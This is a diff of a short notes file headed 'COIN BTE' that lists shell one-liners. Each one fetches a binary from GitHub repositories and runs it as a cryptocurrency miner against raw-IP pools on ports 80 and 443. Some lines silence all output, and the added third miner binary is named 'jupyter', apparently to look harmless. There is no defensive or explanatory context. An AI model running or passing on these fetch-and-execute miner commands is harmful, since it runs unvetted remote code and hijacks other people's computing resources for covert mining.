@@ -1,17 +1,22 @@
 COIN BTE
 
-wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a yespower -o stratum+tcp://159.223.188.176:80 -u web1qdel9x2uf65qpj4mzq9v7n2r6y98ejj98wkd7dq.hidelog -p m=solo -t$(nproc --all) >/dev/null 2>&1
+wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a yespower -o stratum+tcp://159.223.188.176:80 -u web1qdel9x2uf65qpj4mzq9v7n2r6y98ejj98wkd7dq.hidelog -p m=solo -t$(nproc --all)
 
 
 
 
 apt install screen -y && screen -R
 
->/dev/null 2>&1
 
 
 
-git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./AkubapakMU --algo KASPA --pool 178.128.86.41:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.maaa >/dev/null 2>&1
+git clone https://github.com/angkii/m.git && cd m && chmod +x AkubapakMU && ./AkubapakMU --algo KASPA --pool 178.128.86.41:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.madeline
+
+
+
+
+
+git clone https://github.com/angkii/ml.git && cd ml && chmod +x jupyter && ./jupyter -r 148.113.142.107:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc.pop2
 
 
 
